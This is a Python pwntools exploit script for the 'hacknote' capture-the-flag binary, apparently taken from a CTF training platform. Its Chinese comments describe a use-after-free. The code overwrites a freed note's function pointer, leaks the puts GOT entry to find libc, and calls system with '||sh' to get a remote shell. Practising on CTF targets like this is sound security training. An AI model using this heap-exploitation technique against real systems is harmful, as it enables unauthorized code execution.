# -*- coding: utf-8 -*-
from pwn import *

'''
漏洞：uaf
利用：
两次分配四个块，释放掉后再分配小块。
现在可以修改第一次分配堆的内容。
system("||sh")
'''
context(log_level='debug')

p = remote("111.198.29.45",34171)
#p = process("./hacknote")
elf = ELF("./hacknote")
libc = ELF("/home/ubuntu/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so")

def addnote(size, content):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.send(content)
    sleep(0.1)


def delnote(idx):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))


def printnote(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

#gdb.attach(p)
puts = 0x0804862b
addnote(0x20,"a")
addnote(0x20,"b")
delnote(0)
delnote(1)
addnote(8,p32(puts)+p32(elf.got["puts"]))
printnote(0)
#p.interactive()
#pause()
sleep(1)
putsAddr = u32(p.recv()[0:4])
log.success(hex(putsAddr))
libcBase = putsAddr - libc.symbols["puts"]
systemAddr = libcBase + libc.symbols["system"]
log.success(hex(systemAddr))
p.sendline("2")
p.recvuntil(":")
p.sendline("2")
#sleep(3)
addnote(8,p32(systemAddr)+"||sh")
printnote(0)







p.interactive()
